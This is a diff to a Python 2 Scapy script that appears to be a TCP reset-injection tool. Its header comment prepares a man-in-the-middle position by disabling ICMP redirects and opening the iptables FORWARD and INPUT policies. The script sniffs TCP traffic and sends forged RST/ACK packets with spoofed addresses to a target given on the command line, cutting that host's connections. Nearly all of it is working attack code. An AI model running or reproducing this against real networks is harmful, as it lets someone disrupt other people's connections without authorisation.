@@ -6,6 +6,7 @@ sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
 sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/eno1/send_redirects'
 sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp2s0/send_redirects'
 sudo iptables -P FORWARD ACCEPT
+sudo iptables -P INPUT ACCEPT
 '''
 
 import sys
@@ -18,19 +19,26 @@ if len(sys.argv) != 2:
   exit(1)
 
 
+# some global parameters and objects
+SOURCE=sys.argv[1]
+ip=IP()
+tcp=TCP()
+
+
 def parse_packet(p):
-  print "[+] inside function"
+  print "[+] DBG inside function"
   if p.haslayer(TCP) and p[TCP].flags in [ 2, 16, 24 ]: # S,A,PA
-    tcp.seq=0
-    tcp.ack=p[TCP].seq+1
-    send(ip/tcp, verbose=0)
-    print '[+] sent RST/ACK from', p[IP].src, 'to', p[IP].dst, 'remote port', p[TCP].dport
+      ip.src=p[IP].dst
+      ip.dst=SOURCE
+      tcp.sport=p[TCP].sport
+      tcp.dport=p[TCP].dport
+      tcp.seq=0
+      tcp.ack=p[TCP].seq+1
+      tcp.flags='RA'
+      send(ip/tcp, verbose=0)
+      print '[+] sent RST/ACK from', p[IP].src, 'to', p[IP].dst, 'source port', tcp.sport, 'remote port', p[TCP].dport
 
 
 if __name__ == '__main__':
-  ip=IP(dst=sys.argv[1])
-  tcp=TCP(flags='RA')
-
   print '[+] waiting for [S], [A] or [PA] packets...'
   sniff(filter='host ' + ip.src, prn=parse_packet)
-
